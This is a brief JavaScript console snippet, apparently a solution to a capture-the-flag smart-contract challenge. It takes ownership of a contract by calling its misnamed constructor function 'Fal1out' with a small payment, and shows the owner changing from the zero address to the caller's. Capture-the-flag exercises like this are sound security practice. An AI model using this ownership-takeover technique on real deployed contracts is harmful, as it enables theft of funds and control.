```javascript
await contract.owner()
'0x0000000000000000000000000000000000000000'
await contract.Fal1out({value: toWei('0.00001')})
await contract.owner()
'0x....'  // My address
```